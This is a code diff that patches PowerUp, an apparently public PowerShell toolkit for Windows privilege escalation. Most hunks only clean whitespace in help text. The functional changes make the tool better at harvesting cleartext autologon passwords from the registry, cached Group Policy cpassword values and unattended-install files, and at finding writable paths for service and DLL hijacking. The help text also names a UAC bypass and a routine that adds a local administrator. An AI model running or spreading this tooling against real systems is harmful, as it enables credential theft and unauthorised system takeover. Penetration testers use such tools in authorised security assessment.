@@ -741,9 +741,9 @@ function Get-ModifiablePath {
 Parses a passed string containing multiple possible file/folder paths and returns
 the file paths where the current user has modification rights.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -762,6 +762,11 @@ The string path to parse for modifiable files. Required
 .PARAMETER Literal
 
 Switch. Treat all paths as literal (i.e. don't do 'tokenization').
+
+.PARAMETER Comprehensive
+
+Switch. Also look for the 'AppendData/AddSubdirectory' permission. This
+permission is often useless for privilege escalation.
 
 .EXAMPLE
 
@@ -801,7 +806,10 @@ a modifiable path.
 
         [Alias('LiteralPaths')]
         [Switch]
-        $Literal
+        $Literal,
+
+        [Switch]
+        $Comprehensive
     )
 
     BEGIN {
@@ -895,37 +903,48 @@ a modifiable path.
 
             $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                 $CandidatePath = $_
-                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
+                try {
+                # ACLs with InheritOnly in PropagationFlags are useless, see
+                # https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms229747(v=vs.100)?redirectedfrom=MSDN
+                    Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow' -and $_.PropagationFlags -notmatch 'InheritOnly')} | ForEach-Object {
 
-                    $FileSystemRights = $_.FileSystemRights.value__
+                        $FileSystemRights = $_.FileSystemRights.value__
 
-                    $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }
+                        $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }
 
-                    # the set of permission types that allow for modification
-                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
+                        # the set of permission types that allow for modification
+                        $WantedPermissions = @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile')
+                        if ($Comprehensive) {
+                            $WantedPermissions += 'AppendData/AddSubdirectory'
+                        }
+                        $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject $WantedPermissions -IncludeEqual -ExcludeDifferent
 
-                    if ($Comparison) {
-                        if ($_.IdentityReference -notmatch '^S-1-5.*') {
-                            if (-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
-                                # translate the IdentityReference if it's a username and not a SID
-                                $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
-                                $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
+                        if ($Comparison) {
+                            if ($_.IdentityReference -notmatch '^S-1-5.*') {
+                                if (-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
+                                    # translate the IdentityReference if it's a username and not a SID
+                                    $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
+                                    $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
+                                }
+                                $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                             }
-                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
-                        }
-                        else {
-                            $IdentitySID = $_.IdentityReference
-                        }
+                            else {
+                                $IdentitySID = $_.IdentityReference
+                            }
 
-                        if ($CurrentUserSids -contains $IdentitySID) {
-                            $Out = New-Object PSObject
-                            $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
-                            $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
-                            $Out | Add-Member Noteproperty 'Permissions' $Permissions
-                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
-                            $Out
+                            if ($CurrentUserSids -contains $IdentitySID) {
+                                $Out = New-Object PSObject
+                                $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
+                                $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
+                                $Out | Add-Member Noteproperty 'Permissions' $Permissions
+                                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
+                                $Out
+                            }
                         }
                     }
+                }
+                catch {
+                    Write-Warning $_
                 }
             }
         }
@@ -940,9 +959,9 @@ function Get-TokenInformation {
 Helpers that returns token groups or privileges for a passed process/thread token.
 Used by Get-ProcessTokenGroup and Get-ProcessTokenPrivilege.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: PSReflect
 
 .DESCRIPTION
 
@@ -1119,9 +1138,9 @@ function Get-ProcessTokenGroup {
 
 Returns all SIDs that the current token context is a part of, whether they are disabled or not.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect, Get-TokenInformation  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: PSReflect, Get-TokenInformation
 
 .DESCRIPTION
 
@@ -1239,9 +1258,9 @@ function Get-ProcessTokenPrivilege {
 
 Returns all privileges for the current (or specified) process ID.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect, Get-TokenInformation  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: PSReflect, Get-TokenInformation
 
 .DESCRIPTION
 
@@ -1419,9 +1438,9 @@ function Get-ProcessTokenType {
 
 Returns the token type and impersonation level.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect, Get-TokenInformation  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: PSReflect, Get-TokenInformation
 
 .DESCRIPTION
 
@@ -1518,9 +1537,9 @@ function Enable-Privilege {
 
 Enables a specific privilege for the current process.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: PSReflect
 
 .DESCRIPTION
 
@@ -1615,9 +1634,9 @@ function Add-ServiceDacl {
 
 Adds a Dacl field to a service object returned by Get-Service.
 
-Author: Matthew Graeber (@mattifestation)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect  
+Author: Matthew Graeber (@mattifestation)
+License: BSD 3-Clause
+Required Dependencies: PSReflect
 
 .DESCRIPTION
 
@@ -1731,9 +1750,9 @@ function Set-ServiceBinaryPath {
 
 Sets the binary path for a service to a specified value.
 
-Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect  
+Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)
+License: BSD 3-Clause
+Required Dependencies: PSReflect
 
 .DESCRIPTION
 
@@ -1852,9 +1871,9 @@ function Test-ServiceDaclPermission {
 Tests one or more passed services or service names against a given permission set,
 returning the service objects where the current user have the specified permissions.
 
-Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
-License: BSD 3-Clause  
-Required Dependencies: Add-ServiceDacl  
+Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)
+License: BSD 3-Clause
+Required Dependencies: Add-ServiceDacl
 
 .DESCRIPTION
 
@@ -2032,9 +2051,9 @@ function Get-UnquotedService {
 Returns the name and binary path for services with unquoted paths
 that also have a space in the name.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-ModifiablePath, Test-ServiceDaclPermission  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-ModifiablePath, Test-ServiceDaclPermission
 
 .DESCRIPTION
 
@@ -2102,9 +2121,9 @@ function Get-ModifiableServiceFile {
 
 Enumerates all services and returns vulnerable service files.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Test-ServiceDaclPermission, Get-ModifiablePath  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Test-ServiceDaclPermission, Get-ModifiablePath
 
 .DESCRIPTION
 
@@ -2161,9 +2180,9 @@ function Get-ModifiableService {
 
 Enumerates all services and returns services for which the current user can modify the binPath.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Test-ServiceDaclPermission, Get-ServiceDetail  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Test-ServiceDaclPermission, Get-ServiceDetail
 
 .DESCRIPTION
 
@@ -2209,9 +2228,9 @@ function Get-ServiceDetail {
 Returns detailed information about a specified service by querying the
 WMI win32_service class for the specified service name.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -2282,9 +2301,9 @@ function Invoke-ServiceAbuse {
 Abuses a function the current user has configuration rights on in order
 to add a local administrator or execute a custom command.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-ServiceDetail, Set-ServiceBinaryPath  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-ServiceDetail, Set-ServiceBinaryPath
 
 .DESCRIPTION
 
@@ -2519,9 +2538,9 @@ function Write-ServiceBinary {
 Patches in the specified command to a pre-compiled C# service executable and
 writes the binary out to the specified ServicePath location.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -2702,9 +2721,9 @@ function Install-ServiceBinary {
 Replaces the service binary for the specified service with one that executes
 a specified command as SYSTEM.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-ServiceDetail, Get-ModifiablePath, Write-ServiceBinary  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-ServiceDetail, Get-ModifiablePath, Write-ServiceBinary
 
 .DESCRIPTION
 
@@ -2871,9 +2890,9 @@ function Restore-ServiceBinary {
 
 Restores a service binary backed up by Install-ServiceBinary.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-ServiceDetail, Get-ModifiablePath  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-ServiceDetail, Get-ModifiablePath
 
 .DESCRIPTION
 
@@ -2966,9 +2985,9 @@ function Find-ProcessDLLHijack {
 
 Finds all DLL hijack locations for currently running processes.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -3079,11 +3098,11 @@ https://www.mandiant.com/blog/malware-persistence-windows-registry/
                         $ModulePath = "$BasePath\$($Module.ModuleName)"
 
                         # if the module path doesn't exist in the process base path folder
-                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {
+                        if ((-not $ModulePath.Contains("$Env:SystemRoot\System32")) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {
 
                             $Exclude = $False
 
-                            if ($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
+                            if ($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains($Env:SystemRoot)) {
                                 $Exclude = $True
                             }
 
@@ -3123,9 +3142,9 @@ function Find-PathDLLHijack {
 
 Finds all directories in the system %PATH% that are modifiable by the current user.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-ModifiablePath  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-ModifiablePath
 
 .DESCRIPTION
 
@@ -3177,9 +3196,9 @@ function Write-HijackDll {
 Patches in the path to a specified .bat (containing the specified command) into a
 pre-compiled hijackable C++ DLL writes the DLL out to the specified ServicePath location.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -3405,9 +3424,9 @@ function Get-RegistryAlwaysInstallElevated {
 
 Checks if any of the AlwaysInstallElevated registry keys are set.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -3474,9 +3493,9 @@ function Get-RegistryAutoLogon {
 
 Finds any autologon credentials left in the registry.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -3507,26 +3526,23 @@ https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/
     $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
     Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"
 
-    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {
+    $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
+    $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
+    $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
+    $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
+    $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
+    $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword
 
-        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
-        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
-        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
-        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
-        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
-        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword
-
-        if ($DefaultUserName -or $AltDefaultUserName) {
-            $Out = New-Object PSObject
-            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
-            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
-            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
-            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
-            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
-            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
-            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.RegistryAutoLogon')
-            $Out
-        }
+    if ($DefaultPassword -or $AltDefaultPassword) {
+        $Out = New-Object PSObject
+        $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
+        $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
+        $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
+        $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
+        $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
+        $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
+        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.RegistryAutoLogon')
+        $Out
     }
 }
 
@@ -3537,9 +3553,9 @@ function Get-ModifiableRegistryAutoRun {
 Returns any elevated system autoruns in which the current user can
 modify part of the path string.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-ModifiablePath  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-ModifiablePath
 
 .DESCRIPTION
 
@@ -3616,9 +3632,9 @@ function Get-ModifiableScheduledTaskFile {
 Returns scheduled tasks where the current user can modify any file
 in the associated task action string.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-ModifiablePath  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-ModifiablePath
 
 .DESCRIPTION
 
@@ -3697,9 +3713,9 @@ function Get-UnattendedInstallFile {
 Checks several locations for remaining unattended installation files,
 which may have deployment credentials.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .EXAMPLE
 
@@ -3729,6 +3745,9 @@ Custom PSObject containing results.
     $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                             "c:\sysprep\sysprep.inf",
                             "c:\sysprep.inf",
+                            "c:\unattend.xml",
+                            "c:\unattended.xml",
+                            "C:\Autounattend.xml",
                             (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                             (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                             (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
@@ -3757,9 +3776,9 @@ function Get-WebConfig {
 This script will recover cleartext and encrypted connection strings from all web.config
 files on the system. Also, it will decrypt them if needed.
 
-Author: Scott Sutherland, Antti Rantasaari  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Scott Sutherland, Antti Rantasaari
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -3851,7 +3870,7 @@ Author: Antti Rantasaari - 2014, NetSPI
         $Null = $DataTable.Columns.Add('encr')
 
         # Get list of virtual directories in IIS
-        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
+        & "$Env:SystemRoot\System32\InetSRV\appcmd.exe list vdir /text:physicalpath" |
         ForEach-Object {
 
             $CurrentVdir = $_
@@ -3971,9 +3990,9 @@ function Get-ApplicationHost {
 
 Recovers encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
 
-Author: Scott Sutherland  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Scott Sutherland
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -4132,10 +4151,10 @@ function Get-SiteListPassword {
 Retrieves the plaintext passwords for found McAfee's SiteList.xml files.
 Based on Jerome Nokin (@funoverip)'s Python solution (in links).
 
-Author: Jerome Nokin (@funoverip)  
-PowerShell Port: @harmj0y  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Jerome Nokin (@funoverip)
+PowerShell Port: @harmj0y
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -4333,9 +4352,9 @@ function Get-CachedGPPPassword {
 Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences and
 left in cached files on the host.
 
-Author: Chris Campbell (@obscuresec)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Chris Campbell (@obscuresec)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -4452,8 +4471,11 @@ http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
 
                     'Scheduledtasks.xml' {
                         $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/TaskV2/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/TaskV2/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/TaskV2/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
 
                     'DataSources.xml' {
@@ -4540,9 +4562,9 @@ function Write-UserAddMSI {
 Writes out a precompiled MSI installer that prompts for a user/group addition.
 This function can be used to abuse Get-RegistryAlwaysInstallElevated.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -4595,8 +4617,8 @@ function Invoke-EventVwrBypass {
 Bypasses UAC by performing an image hijack on the .msc file extension
 Only tested on Windows 7 and Windows 10
 
-Author: Matt Nelson (@enigma0x3)  
-License: BSD 3-Clause  
+Author: Matt Nelson (@enigma0x3)
+License: BSD 3-Clause
 Required Dependencies: None
 
 .PARAMETER Command
@@ -4654,7 +4676,7 @@ This will write out "Is Elevated: True" to C:\UACBypassTest.
             Write-Verbose "Started eventvwr.exe"
         }
 
-        #Sleep 5 seconds 
+        #Sleep 5 seconds
         Write-Verbose "Sleeping 5 seconds to trigger payload"
         if (-not $PSBoundParameters['WhatIf']) {
             Start-Sleep -Seconds 5
@@ -4682,9 +4704,9 @@ function Invoke-PrivescAudit {
 
 Executes all functions that check for various Windows privilege escalation opportunities.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -4696,7 +4718,7 @@ String. Format to decide on what is returned from the command, an Object Array, 
 
 .PARAMETER HTMLReport
 
-DEPRECATED - Switch. Write a HTML version of the report to SYSTEM.username.html. 
+DEPRECATED - Switch. Write a HTML version of the report to SYSTEM.username.html.
 Superseded by the Format parameter.
 
 .EXAMPLE
@@ -4819,7 +4841,7 @@ detailing any discovered issues.
         $Results = . $Check.Command
         $Results | Where-Object {$_} | ForEach-Object {
             $_ | Add-Member Noteproperty 'Check' $Check.Type
-            if ($Check.AbuseScript){
+            if ($Check.PSObject.Properties.Name -match 'AbuseScript' -and $Check.AbuseScript){
                 $_ | Add-Member Noteproperty 'AbuseFunction' (. $Check.AbuseScript)
             }
         }
